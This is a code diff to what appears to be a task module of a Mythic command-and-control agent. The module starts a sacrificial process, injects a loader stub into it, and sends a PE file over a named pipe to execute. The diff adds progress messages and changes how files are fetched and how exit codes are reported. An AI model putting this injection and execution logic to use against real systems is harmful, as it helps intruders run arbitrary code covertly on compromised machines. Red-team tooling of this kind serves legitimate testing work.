@@ -165,22 +165,17 @@ namespace Tasks
 
                 byte[]? peBytes;
 
-                if (!string.IsNullOrEmpty(parameters.PeId))
+                if(!_agent.GetFileManager().GetFileFromStore(parameters.PEName, out peBytes))
                 {
-                    if (!_agent.GetFileManager().GetFileFromStore(parameters.PeId, out peBytes))
+                    if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.PeId, out peBytes))
                     {
-                        if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.PeId, out peBytes))
-                        {
-                            _agent.GetFileManager().AddFileToStore(parameters.PeId, peBytes);
-                        }
+                        _agent.GetFileManager().AddFileToStore(parameters.PEName, peBytes);
+                    } else
+                    {
+                        throw new InvalidOperationException($"Failed to download {parameters.PEName} from Mythic");
                     }
                 }
-                else
-                {
-                    _agent.GetFileManager().GetFileFromStore(parameters.PEName, out peBytes);
-                }
 
-                peBytes = peBytes ?? throw new InvalidOperationException($"${parameters.PEName} is not loaded (have you registered it?)");
                 if (peBytes.Length == 0)
                 {
                     throw new InvalidOperationException($"{parameters.PEName} has a zero length (have you registered it?)");
@@ -203,7 +198,7 @@ namespace Tasks
                 //proc.OutputDataReceived += Proc_DataReceived;
                 //proc.ErrorDataReceieved += Proc_DataReceived;
                 //proc.Exit += Proc_Exit;
-
+                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "Starting Sacrificial process..."));
                 if (!proc.Start())
                 {
                     throw new InvalidOperationException($"Failed to start sacrificial process {info.Application}");
@@ -216,7 +211,7 @@ namespace Tasks
                         ]
                     )
                 );
-
+                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "Injecting stub..."));
                 if (!proc.Inject(exePEPic))
                 {
                     throw new Exception($"Failed to inject loader into sacrificial process {info.Application}.");
@@ -241,12 +236,12 @@ namespace Tasks
                 client.ConnectionEstablished += Client_ConnectionEstablished;
                 client.MessageReceived += Client_MessageReceived;
                 client.Disconnect += Client_Disconnet;
-
+                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "Connecting to named pipe..."));
                 if (!client.Connect(10000))
                 {
                     throw new Exception($"Injected assembly into sacrificial process: {info.Application}.\n Failed to connect to named pipe: {parameters.PipeName}.");
                 }
-
+                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "Sending PE File..."));
                 IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
                 foreach (IPCChunkedData chunk in chunks)
                 {
@@ -254,6 +249,7 @@ namespace Tasks
                 }
 
                 _senderEvent.Set();
+                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "Waiting for PE to finish..."));
                 DebugHelp.DebugWriteLine("waiting for cancellation token in execute_pe.cs");
                 WaitHandle.WaitAny(
                 [
@@ -270,12 +266,13 @@ namespace Tasks
 
             if (proc is Process procHandle)
             {
-                if (!procHandle.HasExited)
+                if (!procHandle.HasExited && procHandle.PID > 0)
                 {
+                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "Killing process..."));
                     procHandle.Kill();
                     resp.Artifacts = [Artifact.ProcessKill((int)procHandle.PID)];
                 }
-
+                /*
                 if (procHandle.ExitCode != 0)
                 {
                     if ((procHandle.ExitCode & 0xc0000000) != 0
@@ -293,6 +290,8 @@ namespace Tasks
                 {
                     resp.UserOutput += $"\n[*] Process exited with code: 0x{(uint)procHandle.ExitCode:x}";
                 }
+                */
+                resp.UserOutput += $"\n[*] Process exited";
             }
 
             _agent.GetTaskManager().AddTaskResponseToQueue(resp);
